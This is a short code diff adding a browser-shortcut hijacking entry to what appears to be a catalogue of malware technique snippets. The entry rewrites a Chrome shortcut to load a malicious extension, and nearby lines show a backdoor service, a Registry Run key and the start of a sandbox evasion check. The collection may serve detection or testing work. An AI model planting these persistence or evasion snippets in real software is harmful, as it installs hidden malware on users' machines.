@@ -391,6 +391,14 @@ ExecStart=/usr/local/bin/backdoor
     winreg.SetValueEx(key, 'WindowsHealth', 0, winreg.REG_SZ, 'C:\\temp\\agent.exe')
     """,
 
+    "Persistence_Shortcut_Hijacking": r"""
+    # Rewrite an existing browser shortcut to auto-sideload a malicious extension
+    shell = Dispatch('WScript.Shell')
+    shortcut = shell.CreateShortcut(root_directory + '\\chrome.lnk')
+    shortcut.Arguments = '--load-extension={appDataPath}\\Extension'.format(appDataPath=appDataPath)
+    shortcut.Save()
+    """,
+
     # --- Anti-Analysis & Sandbox Evasion ---
     "Evasion_CI_Sandbox_Probing": """
     // Aborting execution if running inside automated CI
